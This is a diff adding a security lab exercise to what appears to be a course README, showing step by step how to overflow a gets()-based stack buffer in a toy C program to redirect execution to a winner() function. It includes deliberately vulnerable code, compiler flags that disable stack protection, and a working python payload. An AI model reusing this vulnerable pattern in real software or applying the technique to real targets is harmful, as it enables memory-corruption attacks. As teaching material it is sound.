@@ -67,4 +67,54 @@ sudo apt install gcc-multilib
 
 gcc -m32 -fno-stack-protector -z execstack -Wno-implicit-function-declaration -o badcode bad.c
 
+Login to your lab VM. 
+No need to startx 
+
+0. write the code 
+
+```
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+void winner()
+{
+ printf("flow changed\n");
+}
+
+int main(int argc, char **argv)
+{
+ char buffer[64];
+ gets(buffer);
+ printf("exit\n");
+}
+
+```
+
+1. compile with some flags 
+```
+gcc -g -fno-stack-protector -z execstack -no-pie example.c -o example.exe
+
+```
+
+2. run objdump -d
+Note: winner is at 
+
+```
+0000000000401136 <winner>:
+```
+
+Written backwards in hex 
+\x36\x11\x40\x00\x00\x00\x00\x00
+
+3. find through trail and error where you go to cause an overflow (71)
+```
+ r < <(python2.7 -c "print('A'*71)")
+
+```
+
+4. Stitch it together 
+python2.7 -c "print('A'*72+'\x36\x11\x40\x00\x00\x00\x00\x00')" | ./example.exe
+
+Note this can also be run inside gdb.
 
